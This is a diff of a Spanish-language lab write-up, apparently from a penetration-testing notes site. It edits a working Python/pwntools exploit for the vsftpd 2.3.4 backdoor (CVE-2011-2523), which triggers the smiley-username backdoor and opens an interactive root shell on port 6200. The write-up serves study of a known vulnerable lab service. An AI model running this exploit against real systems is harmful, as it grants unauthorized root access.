@@ -57,19 +57,14 @@ Al ejecutar el script obtendremos automaticamente una shell como usuario root en
 
 Podemos modificar el script para reemplazar telnet por pwntools, así el script funcionará con las versiones actuales de python 
 
-```#!/usr/bin/python3
-# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution (pwntools)
-# CVE : CVE-2011-2523
-# Original author: HerculesRD
-# Ported to pwntools for Python 3.13+
-
+```python
 from pwn import *
 import argparse
 from signal import signal, SIGINT
 from sys import exit
 
 def handler(signal_received, frame):
-    print('   [+] Exiting...')
+    print('[✦] Exiting...')
     exit(0)
 
 signal(SIGINT, handler)
@@ -84,23 +79,23 @@ portFTP = 21
 user = b"USER nergal:)"
 password = b"PASS pass"
 
-# --- FTP trigger ---
 ftp = remote(host, portFTP, timeout=5.0)
 banner = ftp.recvline(timeout=5.0)
-print(f"[+] Banner: {banner.strip().decode(errors='ignore')}")
+print(f"[✦] Banner: {banner.strip().decode(errors='ignore')}")
 ftp.sendline(user)
 ftp.recvuntil(b"pass", timeout=3.0)  # más laxo que "password."
 ftp.sendline(password)
 ftp.close()
-# --- Backdoor shell ---
+
 try:
     shell = remote(host, 6200, timeout=5.0)
-    print("[+] Success, shell opened")
+    print("[✦] Success, shell opened")
     print("[i] Type 'exit' to quit")
     shell.interactive()
     shell.close()
 except Exception as e:
-    print(f"[-] Could not connect to backdoor: {e}")```
+    print(f"[!] Error: {e}")
+
 
 
 ![img12](/secnotes/assets/img/tproot/12.png) 
